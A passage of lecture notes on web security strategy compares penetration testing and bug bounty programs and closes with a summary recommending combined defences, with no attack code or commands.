* **How it works:** They attack you just like a criminal would—scanning for weaknesses, trying to trick employees (Social Engineering), and exploiting server flaws. Then, they give you a report on how to fix it.
* **The Pro:** They test things code reviews miss, like human error or server misconfigurations.
* **The Con (The "Snapshot" Problem):** A Pen Test only tells you if you are secure **today**. If you update your website tomorrow, you might introduce a new bug, and the previous Pen Test is now outdated.



[Image of penetration testing phases]


### 4. Bug Bounty Programs (Crowdsourced Security)
This is an open invitation to hackers worldwide: "If you find a bug in my site, I will pay you."

* **How it works:** You list your company on a platform (like the instructor's site, bug-bounty.com). Hundreds of hackers test your site continuously. If they find a valid bug, you pay them a "bounty" (money or swag).
* **The Pro:** It is **Future Proof**. Hackers keep testing your site every day, even after you make updates.
* **The Con:** It can be hard to manage the reports if you don't use a platform to help filter them.



### Summary Strategy
The instructor emphasizes that **100% security is impossible**, but you should aim for the best possible defense.

* **The Gold Standard:** Do all four (Secure Code + Review + Pen Test + Bug Bounty).
* **The Realistic Standard:** Most companies compromise due to cost. They typically rely on **Penetration Testing** combined with a **Bug Bounty Program**.
* **The Bare Minimum:** Do *at least* one of them. You are responsible for user data, so doing nothing is not an option.
